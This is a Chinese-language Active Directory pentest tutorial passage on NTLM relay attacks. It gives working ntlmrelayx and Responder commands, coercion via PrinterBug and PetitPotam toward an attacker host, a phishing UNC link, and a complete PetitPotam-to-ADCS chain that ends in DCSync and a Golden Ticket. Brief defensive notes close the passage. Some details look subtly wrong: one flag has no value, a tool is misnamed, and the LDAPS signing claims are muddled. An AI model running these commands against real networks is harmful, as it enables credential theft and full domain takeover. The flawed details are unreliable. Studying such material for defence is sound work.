## 5. NTLM 中继攻击

NTLM 中继(NTLM Relay)是 AD 渗透中**无需破解哈希即可横向移动**的关键技术——攻击者截获客户端的 NTLM 认证流，将其"中继"(转发)到目标服务，冒充该客户端通过认证。与 Pass-the-Hash 不同，中继不接触哈希本身，而是实时转发认证协商。

### 5.1 NTLM 认证流程与中继点

```
客户端            攻击者(中继)             目标服务
  │                  │                       │
  │──协商──────────>│                       │
  │<──Challenge──────│──协商──────────────>│
  │                  │<──Challenge──────────│
  │──Response(用密码哈希加密Challenge)─>│──Response(原样转发)──>│
  │                  │                       │  用客户端密码哈希验签
  │                  │<──认证成功────────────│
  │<──结果──────────│                       │
  ★ 攻击者以客户端身份通过目标服务认证
```

**中继成功的前提**：
- 目标服务**未启用签名**(SMB签名/LDAP签名)——签名会绑定到特定会话，中继后签名校验失败
- 客户端与目标服务账户不同(否则中继无意义)
- 攻击者能诱导客户端向自己发起 NTLM 认证

### 5.2 ntlmrelayx 核心用法

impacket 的 ntlmrelayx 是中继攻击的标准工具：

```bash
# 1. 基础SMB中继：将捕获的认证转发到目标SMB，dump SAM哈希
ntlmrelayx.py -t smb://10.0.0.10 -smb2support
# 同时用responder诱导客户端认证(见5.3)

# 2. 中继到LDAP：修改目标对象(如改密码/加用户/启用账户)
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user lowpriv
# --escalate-user 将lowpriv提升到Domain Admins(需目标对LDAP有写权限)

# 3. 中继到LDAPS(签名通常强制开启，但部分环境LDAPS未强制)
ntlmrelayx.py -t ldaps://dc01.corp.local

# 4. 中继到HTTP(RDP/Web服务)
ntlmrelayx.py -t http://webapp.corp.local --http-port

# 5. 多目标轮询(单目标失败自动切换)
ntlmrelayx.py -tf targets.txt -smb2support -socks
# -socks 保持会话，建立socks代理持续利用
```

### 5.3 触发 NTLM 认证(诱导)

中继需要客户端主动发起 NTLM 认证。多种诱导方式：

```bash
# 1. Responder — LLMNR/NBNS/MDNS 投毒
# 当客户端解析失败(如访问不存在的\\fileshare)，Responder伪造响应指向自己
responder -I eth0 -wrf
# 客户端尝试SMB认证到攻击者 → ntlmrelayx接收中继

# 2. PrinterBug (SpoolSample) — 强制域内主机向攻击者认证
# 需目标启用Print Spooler(默认)
python3 SpoolSample.py dc01.corp.local attacker.corp.local
# DC被迫向attacker认证 → 捕获DC$的认证 → 中继

# 3. PetitPotam — 利用MS-EFSRPC强制认证(无需凭据)
python3 PetitPotam.py attacker.corp.local dc01.corp.local
# 强制DC向attacker发起NTLM认证 → 中继到LDAP(见5.5)

# 4. 网页嵌入UNC/SMB链接(钓鱼)
# 邮件/网页中嵌入 <img src="\\attacker\test"> 触发Outlook/浏览器SMB认证

# 5. WPAD 伪造
# Responder的-w参数伪造WPAD自动代理 → 浏览器发认证
```

### 5.4 跨协议中继

NTLM 中继可跨协议——SMB 捕获的认证可中继到 LDAP/HTTP/SMTP 等，前提是目标协议未强制签名：

| 捕获源协议 | 中继目标协议 | 用途 |
|-----------|-------------|------|
| SMB | SMB | dump SAM/执行(需签名关闭) |
| SMB | LDAP | 改对象/提权(LDAP签名未强制时) |
| HTTP | LDAP | Web认证→域对象修改 |
| SMB | LDAPS | LDAPS签名通常关闭(2024前)，可绕过 |
| HTTP | HTTP | 跨Web应用认证 |

**关键防御与绕过**：
- **SMB签名**：域控默认开启，成员服务器可配置。签名开启则SMB→SMB中继失败
- **LDAP签名**：2020前默认关闭，2020后微软推动强制开启(KB)但大量环境未部署
- **Channel Binding(通道绑定)**：将NTLM绑定到TLS通道，防跨协议中继。需服务支持EPA(扩展保护认证)

### 5.5 PetitPotam → ADCS → 域控接管

2021年最热的攻击链——PetitPotam 强制 DC 向攻击者发起 NTLM 认证，中继到 ADCS 证书服务申请证书，用证书进行 Kerberos PKINIT 认证，最终以 DC$ 身份 DCSync 接管全域。

```bash
# 完整攻击链：
# 1. PetitPotam 触发DC认证
python3 PetitPotam.py attacker.corp.local dc01.corp.local

# 2. ntlmrelayx 中继DC认证到ADCS的HTTP证书申请接口
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# 3. 获得DC$的证书(base64 PKCS12)
# 用证书进行PKINIT Kerberos认证，获取DC$的TGT
python3 PKINITtools.py corp.local/dc01\$ -cert-pfx dc.pfx -dc-ip 10.0.0.1

# 4. 用DC$的TGT进行DCSync
secretsdump.py -k -no-pass corp.local/dc01\$@dc01.corp.local
# 拿到krbtgt哈希 → Golden Ticket → 全域控制
```

> **要点**：PetitPotam+ADCS 是 2021年破坏力最强的攻击链之一，**无需任何初始凭据**即可从零接管域控。防御：强制LDAP签名+Channel Binding、关闭ADCS HTTP接口、打补丁KB5005413。

---

